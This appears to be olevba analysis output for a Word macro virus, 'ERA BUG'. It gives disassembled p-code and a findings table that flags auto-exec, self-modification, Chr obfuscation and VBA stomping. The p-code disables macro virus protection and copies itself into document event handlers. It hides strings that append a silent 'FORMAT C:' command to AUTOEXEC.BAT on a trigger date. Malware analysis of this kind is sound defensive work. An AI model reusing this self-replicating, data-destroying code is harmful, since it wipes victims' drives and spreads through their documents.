' 	Add 
' 	LitStr 0x002F "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #102:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0023 "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #103:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0007 "END SUB"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	QuoteRem 0x000B 0x0014 "[CLOSE] EVENT COPIED"
' Line #106:
' 	QuoteRem 0x000B 0x0013 "COPYING [NEW] EVENT"
' Line #107:
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	MemLd COUNTOFLINES 
' 	St XLINES 
' Line #108:
' 	Ld XLINES 
' 	LitDI2 0x0001 
' 	Add 
' 	St LINEISEXISTING 
' Line #109:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XLINES 
' 	For 
' Line #110:
' 	Ld XLINENUMBER 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemLd LINES 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St XTEXTS 
' Line #111:
' 	Ld XTEXTS 
' 	LitDI2 0x000D 
' 	LitDI2 0x000C 
' 	ArgsLd Mid$ 0x0003 
' 	Ld MYMAGICWORDNEW$ 
' 	Eq 
' 	IfBlock 
' Line #112:
' 	Ld XLINENUMBER 
' 	St LINEISEXISTING 
' 	BoS 0x0000 
' 	ExitFor 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	StartForVariable 
' 	Ld XLINENUMBER 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	Ld LINEISEXISTING 
' 	Ld XLINES 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x002B 0x0012 "IF ALREADY EXIST.."
' Line #116:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x002F "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #117:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0023 "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #118:
' 	ElseBlock 
' 	QuoteRem 0x0010 0x0006 "IF NOT"
' Line #119:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0018 "PRIVATE SUB DOCUMENT_NEW"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #120:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x002F "    APPLICATION.OPTIONS.VIRUSPROTECTION = FALSE"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #121:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0023 "    CALL MICROSOFT_ODBC_DMA_COM_VBA"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #122:
' 	Ld LINEISEXISTING 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0007 "END SUB"
' 	LitDI2 0x0001 
' 	Ld XINDEX 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBPROJECTS 0x0001 
' 	ArgsMemLd VBCOMPONENTS 0x0001 
' 	MemLd CODEMODULE 
' 	ArgsMemCall INSERTLINES 0x0002 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	QuoteRem 0x000B 0x0012 "[NEW] EVENT COPIED"
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	StartForVariable 
' 	Ld XINDEX 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	QuoteRem 0x0004 0x0011 "START ERA MODULES"
' Line #128:
' 	Dim 
' 	VarDefn X (As Single)
' 	VarDefn ACTDATE
' 	VarDefn ACTTIME
' 	VarDefn LINEDATA
' 	VarDefn COMMSTR1
' 	VarDefn COMMSTR2
' 	VarDefn KEYFILENAME
' Line #129:
' 	LitDI2 0x0014 
' 	St ACTDATE 
' 	BoS 0x0000 
' 	LitStr 0x0005 "00:00"
' 	St ACTTIME 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St ISINFECTED 
' Line #130:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St ACTDATE 
' 	EndIf 
' Line #131:
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St KEYFILENAME 
' Line #132:
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St COMMSTR1 
' Line #133:
' 	LitDI2 0x0046 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St COMMSTR2 
' Line #134:
' 	Ld COMMSTR2 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St COMMSTR2 
' Line #135:
' 	Ld COMMSTR2 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St COMMSTR2 
' Line #136:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	Ld ACTDATE 
' 	Eq 
' 	Ld Time 
' 	LitStr 0x0005 "HH:MM"
' 	ArgsLd Format$ 0x0002 
' 	Ld ACTTIME 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #137:
' 	Ld KEYFILENAME 
' 	LitDI2 0x0000 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #138:
' 	Ld KEYFILENAME 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #139:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #140:
' 	LitDI2 0x0001 
' 	Ld LINEDATA 
' 	LineInput 
' Line #141:
' 	Ld LINEDATA 
' 	ArgsLd UCase 0x0001 
' 	Ld COMMSTR2 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld LINEDATA 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0003 "REM"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #142:
' 	LitVarSpecial (True)
' 	St ISINFECTED 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	Loop 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	Ld ISINFECTED 
' 	Not 
' 	IfBlock 
' Line #148:
' 	Ld KEYFILENAME 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ECHO OFF"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "ECHO MORNNING BABY,I NEVER LOVE ANY LIKE YOU..NA"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "ECHO WHAT'VE EVER HAPPENED I STILL LOVE YOU....NA"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "ECHO SEE YOU AT THE MILKY WAY OR MOON RIVER....NA"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "ECHO I WAITING FOR YOU. I LOVE YOU....NA NA NA NAAAA"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld COMMSTR1 
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld COMMSTR2 
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #157:
' 	LitStr 0x0038 "!!!  HAVE YOU DONE BACKING UP YOUR IMPORTANT DATA YET???"
' 	Ld vbOKOnly 
' 	LitStr 0x002D "WARNNING MESSAGE E-R-A--B-U-G........HA HA HA"
' 	ArgsCall MsgBox 0x0003 
' Line #158:
' 	LitStr 0x004E "!!!  HO PHAR JA.!!! PUM AE VA !!!!  ITS TOO LATE FOR DOING THAT...SO SORRY...."
' 	Ld vbOKOnly 
' 	LitStr 0x002D "WARNNING MESSAGE E-R-A--B-U-G........HA HA HA"
' 	ArgsCall MsgBox 0x0003 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	QuoteRem 0x0004 0x000C "END ERA BODY"
' Line #162:
' 	Label ERAERR 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Private Sub DOCUMENT_CLOSE())
' Line #165:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #166:
' 	ArgsCall (Call) MICROSOFT_ODBC_DMA_COM_VBA 0x0000 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Private Sub DOCUMENT_NEW())
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #170:
' 	ArgsCall (Call) MICROSOFT_ODBC_DMA_COM_VBA 0x0000 
' Line #171:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

